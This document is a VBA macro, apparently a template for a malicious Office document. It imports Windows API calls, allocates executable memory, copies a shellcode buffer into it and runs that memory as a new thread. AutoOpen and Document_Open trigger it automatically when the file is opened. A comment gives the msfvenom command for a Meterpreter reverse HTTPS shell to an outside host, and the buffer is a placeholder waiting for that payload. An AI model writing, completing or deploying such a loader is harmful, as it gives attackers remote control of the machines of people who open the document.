Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr,    ByVal dwSize As Long,    ByVal flAllocationType As Long,    ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr,    ByRef sSource As Any,    ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr


Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long

	' TODO: Replace this
    ' msfvenom -p windows/meterpreter/reverse_https LHOST=1.2.3.4 LPORT=443 EXITFUNC=thread -f vbapplication
	buf = Array(1,2,3,4)
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next Counter

    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    Mymacro
End Sub
